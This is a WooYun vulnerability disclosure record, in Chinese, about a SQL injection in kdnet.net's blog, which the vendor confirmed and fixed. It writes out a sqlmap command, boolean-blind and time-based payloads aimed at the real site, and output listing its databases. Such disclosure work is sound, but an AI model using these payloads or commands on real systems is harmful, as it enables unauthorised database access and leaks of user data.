{"id": 34361, "wybug_id": "wooyun-2015-0106565", "wybug_title": "凯迪社区某处伪静态SQL注入(影响千万用户数据)", "wybug_corp": "kdnet.net", "wybug_author": "SeaCream", "wybug_date": "2015-04-14 10:55", "wybug_open_date": "2015-04-15 10:55", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-15：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 与club.kdnet.net在同一个服务器上 可造成1000多万用户资料泄露 可能通过前台登录管理 造成网站失陷  详细说明：  http://blog.kdnet.net/boke.asp?id5815402.html   漏洞证明：  sqlmap -u http://blog.kdnet.net/boke.asp?id5815402*.html --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:29:05custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] [13:29:06] [INFO] resuming back-end DBMS 'microsoft sql server' [13:29:06] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://blog.kdnet.net:80/boke.asp?id5815402' AND 4325=4325 AND 'rfYs'='rfYs.html    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: http://blog.kdnet.net:80/boke.asp?id5815402'; WAITFOR DELAY '0:0:5'--.html    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: http://blog.kdnet.net:80/boke.asp?id5815402' WAITFOR DELAY '0:0:5'--.html---[13:29:08] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008[13:29:08] [INFO] fetching database names[13:29:08] [INFO] fetching number of databases[13:29:08] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[13:29:08] [INFO] retrieved: [13:29:17] [WARNING] time-based comparison requires larger statistical model, please wait...........................[13:29:48] [CRITICAL] there is considerable lagging in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[13:29:49] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors [13:29:50] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[13:29:50] [ERROR] unable to retrieve the number of databases[13:29:50] [INFO] retrieved: [13:29:53] [INFO] heuristics detected web page charset 'GB2312'sqlmap got a 302 redirect to 'http://blog.kdnet.net:80/BokeDescription.asp'. Do you want to follow? [Y/n] n[13:29:56] [WARNING] reflective value(s) found and filtering outdvbook[13:30:40] [INFO] retrieved: master[13:31:19] [INFO] retrieved: tempdb[13:32:02] [INFO] retrieved: model[13:32:39] [INFO] retrieved: msdb[13:33:07] [INFO] retrieved: ReportServer[13:34:32] [INFO] retrieved: ReportServerTempDB[13:36:44] [INFO] retrieved: bbs1[13:37:10] [INFO] retrieved: bbs2[13:37:35] [INFO] retrieved: bbs3[13:38:00] [INFO] retrieved: bbs4[13:38:24] [INFO] retrieved: bbs5[13:38:49] [INFO] retrieved: dvbook[13:39:34] [INFO] retrieved: bbs6[13:40:00] [INFO] retrieved: bbs7依然在继续 只是为了证明有漏洞就不继续了   修复方案：  过滤不合法字符   版权声明：转载请注明来源 SeaCream@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-14 11:53 厂商回复： 确认存在，感谢wooyun以及路人甲 最新状态： 2015-04-14：已经修复漏洞。再次感谢wooyun以及路人甲！ 2015-04-15：修复漏洞，再次感谢SeaCream。  ", "replys": "漏洞评价：\n评论\n     2015-04-10 14:34 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  这个得关注下    \n     2015-04-14 14:22 |    \t\tSeaCream \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:9        | 开始研究鬼影源码了。。。)\t\t \n  大哥 我现在不叫路人甲了 有了名字了 @凯迪网络    \n     2015-04-15 10:53 |    \t\t凯迪网络(乌云厂商)\t\t \n  @SeaCream 好的！感谢你！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}